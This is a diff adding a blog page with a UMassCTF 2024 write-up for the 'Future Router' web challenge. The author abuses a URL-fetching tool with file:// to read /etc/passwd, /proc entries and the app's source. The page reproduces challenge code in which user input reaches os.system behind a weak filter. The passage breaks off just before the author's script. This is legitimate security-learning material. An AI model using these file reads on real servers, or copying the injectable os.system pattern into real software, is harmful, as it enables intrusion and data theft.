@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="UMassCTF 2024Web&#x2F;Future RouterChallenge OverviewDescription : Mr. Krabs just got a brand new router in the mail for him to use in the Krusty Krab. There was no mailing address so he’s tasked you">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UMassCTF 2024 Web Future Router Writeup">
+<meta property="og:url" content="http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/index.html">
+<meta property="og:site_name" content="j4ck4l&#39;s Blog">
+<meta property="og:description" content="UMassCTF 2024Web&#x2F;Future RouterChallenge OverviewDescription : Mr. Krabs just got a brand new router in the mail for him to use in the Krusty Krab. There was no mailing address so he’s tasked you">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/index.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/dash.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/curl.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/service.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/example.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/passwd.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/ws.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/welcome.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/ls.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/lsroot.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/testing.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/umass/flag.png">
+<meta property="article:published_time" content="2024-05-14T10:20:19.793Z">
+<meta property="article:modified_time" content="2024-05-14T10:20:19.793Z">
+<meta property="article:author" content="j4ck4l">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://j4ck4l-24.github.io/images/umass/index.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>UMassCTF 2024 Web Future Router Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/14/BackDoorCTF23_Web_Writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/14/corCTF23_Web_Writeup/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&text=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&title=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&is_video=false&description=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=UMassCTF 2024 Web Future Router Writeup&body=Check out this article: http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&title=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&title=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&title=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&title=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&name=UMassCTF 2024 Web Future Router Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&t=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UMassCTF-2024"><span class="toc-number">1.</span> <span class="toc-text">UMassCTF 2024</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Future-Router"><span class="toc-number">2.</span> <span class="toc-text">Web&#x2F;Future Router</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification"><span class="toc-number">2.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag"><span class="toc-number">2.3.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        UMassCTF 2024 Web Future Router Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">j4ck4l</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-14T10:20:19.793Z" class="dt-published" itemprop="datePublished">2024-05-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="UMassCTF-2024"><a href="#UMassCTF-2024" class="headerlink" title="UMassCTF 2024"></a>UMassCTF 2024</h1><h1 id="Web-Future-Router"><a href="#Web-Future-Router" class="headerlink" title="Web&#x2F;Future Router"></a>Web&#x2F;Future Router</h1><h2 id="Challenge-Overview"><a href="#Challenge-Overview" class="headerlink" title="Challenge Overview"></a>Challenge Overview</h2><p><code>Description</code> : Mr. Krabs just got a brand new router in the mail for him to use in the Krusty Krab. There was no mailing address so he’s tasked you with figuring out where the router is from and finding a flag!</p>
+<p>We were given access to a website at <a target="_blank" rel="noopener" href="http://future-router.ctf.umasscybersec.org/">this link</a>. </p>
+<p>So here is an image how the website looks like</p>
+<p><img src="/./images/umass/index.png" alt="Index"></p>
+<p>The site features three main routes:</p>
+<ul>
+<li>Dashboard –&gt; <code>/dash</code></li>
+<li>cURL –&gt; <code>/cURL</code></li>
+<li>FuTuR3 r0UT3R Customer Service –&gt; <code>/customerservice</code></li>
+</ul>
+<p><img src="/./images/umass/dash.png" alt="dash"></p>
+<p><img src="/./images/umass/curl.png" alt="curl"></p>
+<p><img src="/./images/umass/service.png" alt="service"></p>
+<h2 id="Vulnerability-Identification"><a href="#Vulnerability-Identification" class="headerlink" title="Vulnerability Identification"></a>Vulnerability Identification</h2><p>So let’s analyse every route.</p>
+<ul>
+<li><p><code>dash</code> –&gt; Upon exploring the Dashboard route, we discovered information about three devices, each with a <code>hostname</code> and <code>port</code> specified.</p>
+<ul>
+<li><p>Hostname:patricks-rock,<br>Port - Service,<br>http:80</p>
+</li>
+<li><p>Hostname:spongebobs-spatula,<br>Port - Service,<br>http:80</p>
+</li>
+<li><p>Hostname:squidwards-clarinet,<br>Port - Service,<br>http:80</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>Attempts to access these devices via our browser were unsuccessful. However, we speculated that one of these devices might contain the email address mentioned in the challenge description. For now, we set this aside for further investigation.</p>
+<ul>
+<li><code>cURL</code> –&gt; The cURL route presented a simple tool for fetching URLs and displaying their responses.</li>
+</ul>
+<p>For example if we pass <code>www.google.com</code> as input displays the response from the specified URL.</p>
+<p><img src="/./images/umass/example.png" alt="example"></p>
+<p>We quickly realized that we could leverage this tool to read local files by utilizing the <code>file://</code> protocol. This allowed us to access sensitive system files such as <code>/etc/passwd</code>, indicating a potential security vulnerability.</p>
+<p><img src="/./images/umass/passwd.png" alt="passwd"></p>
+<p>At this moment I thought we have to find a flag.txt on the machine by hit and trial in every directory possible.</p>
+<p>But then I tried accessing <code>/proc/self/cmdline</code> as my second approach and we can see it is a python gunicorn gateway application.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cmdline</span></span><br><span class="line">/usr/local/bin/python/usr/local/bin/gunicorn-w4--bind0.0.0.0:8000app:app</span><br></pre></td></tr></table></figure>
+
+<p>Hence I tried reading the <code>app.py</code> in the current working directory using <code>file:///proc/self/cwd/app.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> blueprints.routes <span class="keyword">import</span> httpserver</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># This web server is the property of Sheldon J. Plankton, </span></span><br><span class="line"><span class="comment"># please refrain from reading this secret source code.</span></span><br><span class="line"><span class="comment"># I WILL USE THIS ROUTER TO STEAL THE SECRET KRABBY PATTY FORMULA!</span></span><br><span class="line">app.register_blueprint(httpserver, url_prefix=<span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>The source code is hidden somehow and we have to find the way to read it as mentioned in the comments of the <code>app.py</code></p>
+<p>When I tried to access <code>/proc/self/environ</code> it gave me the name of directory –&gt; <code>/planktonsrouter1ba8b69e</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># environ</span></span><br><span class="line">OLDPWD=/PWD=/planktonsrouter1ba8b69e</span><br></pre></td></tr></table></figure>
+<p>As it is using blueprints we can read the source code through <code>file:///planktonsrouter1ba8b69e/blueprints/routes.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># routes.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, Blueprint,send_from_directory</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> pycurl </span><br><span class="line"></span><br><span class="line">httpserver = Blueprint(<span class="string">&#x27;httpserver&#x27;</span>, __name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#@httpserver.route(&quot;/docs&quot;,methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="comment">#def docs():</span></span><br><span class="line"><span class="comment">#   return &quot;&quot;&quot;&lt;!doctype html&gt;</span></span><br><span class="line"><span class="comment">#    &lt;h1&gt;Router Docs&lt;/h1&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    &lt;h2&gt;Websocket API&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    &lt;strong&gt;<span class="doctag">TODO:</span> Document how to talk to </span></span><br><span class="line"><span class="comment">#   Karen&#x27;s customer service module in ../karen/customerservice.py</span></span><br><span class="line"><span class="comment">#   Also figure out how to use supervisord better.&lt;/strong&gt;</span></span><br><span class="line"><span class="comment">#&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Securely CURL URLs, absolutely no bugs here!</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@httpserver.route(<span class="params"><span class="string">&quot;/static/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>,path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@httpserver.route(<span class="params"><span class="string">&quot;/cURL&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl</span>():</span><br><span class="line">    <span class="keyword">if</span>(request.method == <span class="string">&quot;GET&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;curl.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span>(request.method == <span class="string">&quot;POST&quot;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            buffer = BytesIO()</span><br><span class="line">            c = pycurl.Curl()</span><br><span class="line">            c.setopt(c.URL, request.json[<span class="string">&#x27;URL&#x27;</span>])</span><br><span class="line">            c.setopt(c.WRITEDATA, buffer)</span><br><span class="line">            c.perform()</span><br><span class="line">            c.close()</span><br><span class="line">            DATA = buffer.getvalue()</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;success&quot;</span>:DATA.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>:<span class="built_in">str</span>(e.with_traceback(<span class="literal">None</span>))&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@httpserver.route(<span class="params"><span class="string">&quot;/customerservice&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">customerservice</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;customerservice.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">NETWORK = [</span><br><span class="line">    &#123;<span class="string">&#x27;hostname&#x27;</span>:<span class="string">&#x27;patricks-rock&#x27;</span>,<span class="string">&#x27;ports&#x27;</span>:[&#123;<span class="string">&#x27;service&#x27;</span>:<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;num&#x27;</span>:<span class="number">80</span>&#125;]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;hostname&#x27;</span>:<span class="string">&#x27;spongebobs-spatula&#x27;</span>,<span class="string">&#x27;ports&#x27;</span>:[&#123;<span class="string">&#x27;service&#x27;</span>:<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;num&#x27;</span>:<span class="number">80</span>&#125;]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;hostname&#x27;</span>:<span class="string">&#x27;squidwards-clarinet&#x27;</span>,<span class="string">&#x27;ports&#x27;</span>:[&#123;<span class="string">&#x27;service&#x27;</span>:<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;num&#x27;</span>:<span class="number">80</span>&#125;]&#125;,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"><span class="meta">@httpserver.route(<span class="params"><span class="string">&quot;/dash&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dash</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>,network=NETWORK)</span><br><span class="line"></span><br><span class="line"><span class="meta">@httpserver.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)   </span><br></pre></td></tr></table></figure>
+
+
+<p>We noticed a Python file mentioned in the comment <code>../karen/customerservice.py</code>. However, while we were solving, we found the file name using an alternative approach.</p>
+<p>Exploring the <code>/proc</code> directory, we experimented with different process IDs (PIDs).</p>
+<p>In <code>/proc/1/cmdline</code> we can see a bash script being run <code>entrypoint.sh</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># entrypoint.sh</span></span><br><span class="line"><span class="built_in">cd</span> /planktonsrouter1ba8b69e</span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop to monitor and restart Gunicorn if it crashes</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Restarting Gunicorn...&quot;</span></span><br><span class="line">    gunicorn -w 4 --<span class="built_in">bind</span> 0.0.0.0:8000 <span class="string">&#x27;app:app&#x27;</span></span><br><span class="line">    <span class="built_in">sleep</span> 1</span><br><span class="line"><span class="keyword">done</span> &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop to monitor and restart customerservice.py if it crashes</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    python3 karen/customerservice.py</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Restarting Customer Service...&quot;</span></span><br><span class="line">    <span class="built_in">sleep</span> 1</span><br><span class="line"><span class="keyword">done</span> &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop to clean up old files in /tmp every 15 seconds</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    find /tmp/* -<span class="built_in">type</span> f -mmin +2 -<span class="built_in">exec</span> <span class="built_in">rm</span> -f &#123;&#125; +</span><br><span class="line">    <span class="built_in">sleep</span> 15</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio, os, re</span><br><span class="line"><span class="keyword">from</span> websockets.server <span class="keyword">import</span> serve</span><br><span class="line"></span><br><span class="line"><span class="comment"># Due to security concerns, I, Sheldon J. Plankton have ensured this module</span></span><br><span class="line"><span class="comment"># has no access to any internet service other than those that are</span></span><br><span class="line"><span class="comment"># trusted. This agent will trick Krabs into sending me the secret</span></span><br><span class="line"><span class="comment"># krabby patty formula which I will log into Karen&#x27;s secret krabby patty </span></span><br><span class="line"><span class="comment"># secret formula file! First, I have to fix a few security bugs!</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KarenCustomerServiceAgent</span>:</span><br><span class="line">    SECRET_KEY = <span class="built_in">bytearray</span>(<span class="string">b&quot;\xe1\x86\xb2\xa0_\x83B\xad\xd7\xaf\x87f\x1e\xb4\xcc\xbf...i will have the secret krabby patty formula.&quot;</span>)</span><br><span class="line">    Dialogue = &#123;</span><br><span class="line">        <span class="string">&quot;Welcome&quot;</span>:<span class="string">&quot;Hello! Welcome to the Future Router service bot!&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Secret formula&quot;</span>:<span class="string">&quot;Thank you for your input, we will process your request in 1-3 business days&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Problem&quot;</span>:<span class="string">&quot;Are you having an issue? Please enter the secret krabby patty formula in the dialogue box to continue&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_input</span>(<span class="params">self,message</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;hello&quot;</span> <span class="keyword">in</span> message):</span><br><span class="line">            <span class="keyword">return</span> self.Dialogue[<span class="string">&quot;Welcome&quot;</span>]</span><br><span class="line">        <span class="keyword">elif</span>(<span class="string">&quot;krabby patty&quot;</span> <span class="keyword">in</span> message):</span><br><span class="line">            filtered_message = re.sub(<span class="string">r&quot;(\&quot;|\&#x27;|\;|\&amp;|\|)&quot;</span>,<span class="string">&quot;&quot;</span>,message)</span><br><span class="line">            os.system(<span class="string">f&#x27;echo &quot;<span class="subst">&#123;filtered_message&#125;</span>\n&quot; &gt;&gt; /dev/null&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> self.Dialogue[<span class="string">&quot;Secret formula&quot;</span>]</span><br><span class="line">        <span class="keyword">elif</span>(<span class="string">&quot;problem&quot;</span> <span class="keyword">in</span> message):</span><br><span class="line">            <span class="keyword">return</span> self.Dialogue[<span class="string">&quot;Problem&quot;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I could not understand your message, this agent is under construction. Please use the other implemented features for now!&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor_decrypt</span>(<span class="params">self,ciphertext</span>):</span><br><span class="line">        plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">        cipher_arr = <span class="built_in">bytearray</span>(ciphertext)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(cipher_arr)):</span><br><span class="line">            plaintext += <span class="built_in">chr</span>(cipher_arr[i] ^ self.SECRET_KEY[i % <span class="built_in">len</span>(self.SECRET_KEY)])</span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">KarenAgent = KarenCustomerServiceAgent()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">respond</span>(<span class="params">websocket</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">for</span> message <span class="keyword">in</span> websocket:</span><br><span class="line">        data = KarenAgent.xor_decrypt(message.encode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br><span class="line">        response = KarenAgent.handle_input(data)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(response)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> serve(respond, <span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">9000</span>):</span><br><span class="line">        <span class="keyword">await</span> asyncio.Future()  <span class="comment"># run forever</span></span><br><span class="line"></span><br><span class="line">asyncio.run(main())          </span><br></pre></td></tr></table></figure>
+
+<p>For now, let’s set aside this file and explore another functionality: <code>/customerservice</code>.</p>
+<p>This route hosts a websocket application. Despite attempting various inputs such as <code>hi</code> or <code>hello</code>, we encountered no success. This outcome was unsurprising upon reviewing the source code.</p>
+<p><img src="/./images/umass/ws.png" alt="ws"></p>
+<p>After analyzing the source code, we observed that the input is initially decoded using the <code>xor_decrypt</code> function before being passed into the <code>handle_input()</code> function.</p>
+<p>If the message contains <code>hello</code> after decryption, the application responds with the welcome message.</p>
+<p>Let’s proceed with a test.</p>
+<p>So here is our script</p>
